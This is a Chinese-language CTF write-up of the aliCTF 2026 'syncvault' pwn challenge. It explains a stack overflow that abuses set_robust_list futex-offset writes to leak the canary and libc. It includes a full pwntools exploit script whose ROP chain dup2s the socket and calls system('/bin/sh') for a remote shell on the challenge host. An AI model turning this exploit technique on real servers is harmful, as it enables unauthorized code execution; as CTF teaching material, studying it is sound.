---
title: syncvault
published: 2026-02-06
pinned: false
description: aliCTF 2026 pwn
tags:
  - pwn
category: ctf
author: wtt
draft: false
date: 2026-02-06
---
aliCTF 2026 pwn -syncvault，题目代码有很多，总体是实现一个关于SYNCVAULT协议的多线程网络服务器应用程序，通过栈溢出漏洞实现`set_robust_list` 系统调用进行任意内存写入
## 0x10 题目分析
.BSS 
```c
.bss:000000000000FDC0 g_robust_list_head              
.bss:000000000000FDC8 xmmword_FDC8                  
.bss:000000000000FDD8                
.bss:000000000000FDE0 g_robust_list_next                   
.bss:000000000000FDE8 g_robust_list_tid               
.bss:000000000000FDF0 body_size                    
.bss:000000000000FDF8 g_head_size                   
.bss:000000000000FE00 io_size                       
.bss:000000000000FE08 g_sync_size        
```

client_connection
```c
// v66_size = 0x30
_BYTE v66[48]; // [rsp+20h] [rbp-11C8h] BYREF
__int64 v67; // [rsp+50h] [rbp-1198h]

	g_robust_list_tid = 0LL;            
	g_robust_list_head = (__int64)&g_robust_list_next;
	v67 = 8LL;
	g_robust_list_next = (__int64)&g_robust_list_head;
	xmmword_FDC8 = 0LL;
	v28 = syscall(186LL, &buf, v69);    
	v29 = g_sync_size;                  
	LODWORD(g_robust_list_tid) = v28;
	// if g_sync_size > 0x38 ==> stack leak
	if ( (unsigned __int64)g_sync_size > 0x38 )
	  v29 = 56LL;
	if ( !(unsigned int)read_exact(v1, (__int64)s, v29) )
	{
	  v30 = s;                         
	  v31 = v66;
	  if ( (unsigned int)v29 >= 8 )
	  {
		LODWORD(v39) = 0;               
		do
		{
		  v40 = (unsigned int)v39;     
		  v39 = (unsigned int)(v39 + 8);
		  //栈溢出 多出8字节覆盖到v67
		  *(_QWORD *)&v66[v40] = *(_QWORD *)&s[v40];
		}
		while ( (unsigned int)v39 < (v29 & 0xFFFFFFF8) );
		v31 = &v66[v39];
		v30 = &s[v39];
	  }
	  v32 = 0LL;                        
	  if ( (v29 & 4) != 0 )            
	  {
		*(_DWORD *)v31 = *(_DWORD *)v30;
		v32 = 4LL;
	  }
	  if ( (v29 & 2) != 0 )             
	  {
		*(_WORD *)&v31[v32] = *(_WORD *)&v30[v32];
		v32 += 2LL;
	  }
	  if ( (v29 & 1) != 0 )             
		v31[v32] = v30[v32];            
	  v33 = 0LL;                        
	  *(_QWORD *)&xmmword_FDC8 = v67;   
	  syscall(273LL, &g_robust_list_head, 24LL, v31);
	  // syscall(186) = gettid() again to get TID for response
	  v34 = syscall(186LL);
	  v35 = (int)__snprintf_chk(v68, 64LL, 2LL, 64LL, "TID=%d\n", v34);
	  do
	  {
		v36 = write(v1, &v68[v33], v35 - v33);
		if ( v36 < 0 )
		  v36 = 0LL;
		v33 += v36;
	  }
	  while ( v33 < v35 );
	}
```

SNAPSHOT
```c
 _BYTE v9[1032]; // [rsp+0h] [rbp-438h] BYREF
 
  v1 = g_head_size;
  v10 = __readfsqword(0x28u);
  memset(v9, 0x48u, 0x400uLL);
  if ( (unsigned __int64)g_head_size <= 0x1000 )
  {
    if ( !g_head_size )
      goto LABEL_7;
    if ( (unsigned __int64)g_head_size > 0x400 )
      v1 = 1024LL;
  }
  else
  {
    v1 = 4096LL;
  }

  v2 = 0LL;
  do
  {
    v3 = write(fd, &v9[v2], v1 - v2);
    if ( v3 < 0 )
      v3 = 0LL;
    v2 += v3;
  }
  while ( v2 < v1 );
LABEL_7:
  v4 = body_size;
  v5 = (char *)malloc(body_size);
  v6 = v5;
  if ( v5 )
  {
    __memset_chk(v5, 80LL, v4, v4);
    if ( v4 )
    {
      for ( i = 0LL; i < v4; i += v8 )
      {
        v8 = write(fd, &v6[i], v4 - i);
        if ( v8 < 0 )
          v8 = 0LL;
      }
    }
    free(v6);
  }
  _exit(0);
}
```

第一段write：  
   v1要么等于0x400，要么等于0x1000 ，如果v1=0x400，那么只会输出被memset为'H'的0x400字节，所以需要`g_head_size > 0x1000` 让其输出栈后面的内容，从而泄露canary 和libc   
第二段write：  
没有检查，直接输出body_size字节的数据  ,当body_size足够大的时候能一直输出，构造成死循环，避免进程直接退出

ECHO
```c
 _BYTE v6[1032]; // [rsp+0h] [rbp-438h] BYREF
  v1 = io_size;
  v7 = __readfsqword(0x28u);
  if ( (unsigned __int64)io_size > 0x1000 )
  {
    v2 = 4096LL;
    if ( (unsigned int)read_exact(fd, (__int64)v6, 0x1000uLL) )
      return v7 - __readfsqword(0x28u);
    goto LABEL_8;
  }
  v2 = 1024LL;
  if ( (unsigned __int64)io_size <= 0x400 )
    v2 = io_size;
  if ( !(unsigned int)read_exact(fd, (__int64)v6, v2) && v1 )
  {
LABEL_8:
    v4 = 0LL;
    do
    {
      v5 = write(fd, &v6[v4], v2 - v4);
      if ( v5 < 0 )
        v5 = 0LL;
      v4 += v5;
    }
    while ( v4 < v2 );
  }
  return v7 - __readfsqword(0x28u);
}
```
Io_size<0x400,读取io_size字节到v6,v6_offset = 0x438 ,
Io_size>0x1000 读取0x1000字节到v6(栈上)，0x400<Io_size<0x1000，读取0x400字节到v6，所以想覆盖ret必须要`io_size>0x1000

## 0x20 利用思路
1. 用SETBODY SETHEAD SET命令分别开启线程，设置值为对应TID
2. 通过SYNC命令栈溢出漏洞，覆盖futex_offset=对应bss段的偏移
3. QUIT命令让线程退出，触发robust_list写操作，将地址为g_robust_list_head+futexoffset的内容写为0x40000000（超级大）
4. 从而利用SNAPSHOT命令泄露栈上内容，得到canary和libc
5. 最后用ECHO命令使payload读入到栈上，构造ROP链，覆盖返回地址


Q:为什么不直接设置Io_size 、head_size 为5000（>4096），而是靠robust_list去写？  
A:用SETBODY最大只能将body_size设置为1024 ，head_size同样  
```c
v18 = __isoc23_strtoul(&v69[8], 0LL, 10LL);// SETBODY 
	  v19 = 1024LL;
	  if ( v18 <= 0x400 )
		v19 = v18;
	  v20 = v19;
	  if ( !v19 )
		v20 = 1LL;
	  v21 = 0LL;
	  body_size = v20;                      // Store body size in 'size' global
	  v22 = (int)__snprintf_chk(s, 64LL, 2LL, 64LL, "OK body=%zu\n");
```


Q:为什么选择用tid去覆盖 Io_size 、head_size 、body_size?  
A:因为 robust 机制只会“接管”它认为是 futex 锁的值，而futex 锁的“合法形态”是低 30 位 = 某个线程的 TID

## 0x30 利用脚本
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*
import re
import os
from pwn import *
context(arch='amd64', os='linux', log_level='debug')
local = 0
ELF_PATH="./pwn"
if local:
    p = process("./pwn")
    ip = "223.6.249.127"
    port = 19713
else:
    ip = "223.6.249.127"
    port = 19713

elf = ELF(ELF_PATH)
libc = ELF("./libc.so")
rop1 = ROP(libc)
def make_conn():
    return remote(ip, port)

def send_cmd(io, line):
    io.sendline(line.encode())

def set_size(io, n):
    send_cmd(io, f"SET {n}")
    return io.recvline()

def set_sync_size(io, n):
    send_cmd(io, f"SETSYNC {n}")
    return io.recvline()

def set_head(io, n):
    send_cmd(io, f"SETHEAD {n}")
    return io.recvline()

def set_body(io, n):
    send_cmd(io, f"SETBODY {n}")
    return io.recvline()

def echo(io, data: bytes):
    send_cmd(io, "ECHO")
    io.send(data)

def diag(io):
    send_cmd(io, "DIAG")

def snapshot(io):
    send_cmd(io, "SNAPSHOT")
    
def sync_task(io, payload: bytes):
    send_cmd(io, "SYNC")
    io.send(payload)

def queue_backup(io):
    send_cmd(io, "QUEUE BACKUP")
    return io.recvline()

def show_tasks(io):
    send_cmd(io, "SHOW TASKS")
    return io.recvuntil(b"\n", drop=False)

def get_tid(io):
    set_sync_size(io, 0x10)
    # only SYNC will output TID
    sync_task(io, b'a'*0x10)
    io.recvuntil(b"TID=")
    tid = int(io.recvline().strip(),10)
    return tid

def quit_con(io):
    send_cmd(io, "QUIT")

BODY_OFFSET=0x10
HEAD_OFFSET=0x18
IO_OFFSET=0x20

#body_size
s1 = make_conn()
tid = get_tid(s1)
info("tid = "+ hex(tid))
set_body(s1, tid)
set_sync_size(s1, 0x100)
payload = b'a'*0x30 + p64(BODY_OFFSET)
sync_task(s1, payload)
quit_con(s1)
s1.close()
info("Body")

# head_size
s2 = make_conn()
tid = get_tid(s2)
info("tid = "+ hex(tid))
set_head(s2, tid)
set_sync_size(s2, 0x100)
payload = b'a'*0x30 + p64(HEAD_OFFSET)
sync_task(s2, payload)
quit_con(s2)
s2.close()
info("HEAD")

# io_size >0x400
# call echo () will read in more byte
s3 = make_conn()
tid = get_tid(s3)
info("tid = "+ hex(tid))
set_size(s3, tid)
set_sync_size(s3, 0x100)
payload = b'a'*0x30 + p64(IO_OFFSET)
sync_task(s3, payload)
quit_con(s3)
s3.close()
info("IO")
  
leak_s = make_conn()
snapshot(leak_s)
leakinfo = leak_s.recv(0x1000)
canary = u64(leakinfo[0x408:0x410])
libc_base = u64(leakinfo[0xeb8:0xec0]) - 0x60d88
info("canary = " + hex(canary))
info("libc = " + hex(libc_base))
binsh = libc_base + next(libc.search(b"/bin/sh"))
system = libc_base + libc.sym["system"]
dup2 = libc_base + libc.sym["dup2"]
pop_rdi_ret = rop1.find_gadget(['pop rdi', 'ret'])[0] + libc_base
pop_rsi_ret = rop1.find_gadget(['pop rsi', 'ret'])[0] + libc_base

rop = p64(pop_rdi_ret) + p64(4)
rop += p64(pop_rsi_ret) + p64(0)
rop += p64(dup2)
rop += p64(pop_rdi_ret) + p64(4)
rop += p64(pop_rsi_ret) + p64(1)
rop += p64(dup2)
rop += p64(pop_rdi_ret) + p64(4)
rop += p64(pop_rsi_ret) + p64(2)
rop += p64(dup2)
rop += p64(pop_rdi_ret) + p64(binsh) + p64(system)
payload = b'a'*0x400 + p64(0) + p64(canary) + p64(0)*5 + rop
payload = payload.ljust(0x1000,b'\x00')

exploit = make_conn()
echo(exploit, payload)
exploit.interactive()
```

Q:如果是每次命令都在一个线程完成会怎么样？robust_list不是也会遍历所有节点吗 
Q:如果不要QUIT命令就会泄露不完0x1000个字节是为什么？
## 0x40 相关知识

### 1.set_robust_list
set_robust_list(struct robust_list_head \*head, size_t len)：把当前线程的robust futex 链表头地址登记到内核  
 `struct robust_list_head *head`，这是**用户空间**里的一个结构体地址，current->robust_list = head
```c
// 8B
#define FUTEX_OWNER_DIED 0x40000000
struct robust_list {
    struct robust_list *next;
};
```
robust_list 结构
```c
// 24B
struct robust_list_head {
    struct robust_list list;      // 正常的锁链表
    long futex_offset;            // futex 在结构体内的偏移
    struct robust_list *list_op_pending;  // ← pending
};
```

`size_t len`，必须等于sizeof(struct robust_list_head)，在64 位上是 **24 字节**

### 2.robust futex

`robust futex 位布局`

| 31      | 30         | 0   |
| ------- | ---------- | --- |
| WAITERS | OWNER_DIED | TID |

在线程 **异常退出**时  
do_exit()  
 └── exit_robust_list()  
       └── 遍历你注册的 robust list  
             └── 修复所有还没解锁的 futex  

如果一个 futex 锁的 owner 线程死了：
1. 内核找到这个 futex 的内存地址
2. 把 futex 的 owner TID 改成 `FUTEX_OWNER_DIED`
3. 唤醒等待这个 futex 的线程

 owner 线程死判断：  
只要FUTEX_OWNER_DIED这个位被置位，就说明`原持锁线程已经在未解锁情况下退出`，这样别的线程就能检测到`pthread_mutex_lock → 返回 EOWNERDEAD`，从而避免死锁

具体举例：
 1. 当线程 A 挂掉时
内核在 `do_exit()` 里执行`exit_robust_list()`，对它持有的每个锁做两件事：
```c
futex_word |= FUTEX_OWNER_DIED;  // 标记：线程死了 
futex_word &= FUTEX_TID_MASK;    // 清除原锁不再是永远锁死状态, 而是变成可恢复的异常锁状态
TID wake_waiters();              // 唤醒正在等锁的线程
```

2. 线程 B 这时来加锁
线程 B 被唤醒后再次尝试获取锁，glibc 发现 futex 里有这个标志位`FUTEX_OWNER_DIED (0x40000000)`，于是 **不会当作正常加锁成功**，而是返回：`pthread_mutex_lock(...) → EOWNERDEAD`  
Q：为什么不直接当作成功？  
A：锁保护的数据结构可能已经处于“写了一半”的损坏状态，线程 A 挂掉时可能正在修改共享数据  
所以 pthread 设计成：

|返回值|含义|
|---|---|
|0|正常加锁|
|**EOWNERDEAD**|锁的前任主人死了，你现在接管，但数据可能坏了|

**正确的恢复流程**：   
```
int r = pthread_mutex_lock(&mtx);
  if (r == EOWNERDEAD) {    // 上一个线程死在临界区里
    repair_shared_data();              // 修复共享状态
    pthread_mutex_consistent(&mtx);    // 告诉系统修好了
}
```

### 3.dup2(int oldfd, int newfd)
把 oldfd 复制成 newfd，让 newfd 指向和 oldfd 一样的东西
远程 shell 想能交互，必须让 `/bin/sh` 的输入输出都走 **网络 socket**,socket fd = 程序 accept() 返回值
```c
dup2(sock, 0); // stdin
dup2(sock, 1); // stdout
dup2(sock, 2); // stderr
```
很多题里是 **4**，是因为程序在 accept 前已经开过别的 fd

|fd|含义|
|---|---|
|0|stdin|
|1|stdout|
|2|stderr|
|3|第一个新打开的文件/socket|

```python
(一般socket 3~6)
rop = p64(pop_rdi_ret) + p64(4)
rop += p64(pop_rsi_ret) + p64(0)
rop += p64(dup2)

rop += p64(pop_rdi_ret) + p64(4)
rop += p64(pop_rsi_ret) + p64(1)
rop += p64(dup2)

rop += p64(pop_rdi_ret) + p64(4)
rop += p64(pop_rsi_ret) + p64(2)
rop += p64(dup2)
```



## 0x50 参考链接
(官方WP)[https://xz.aliyun.com/news/91567]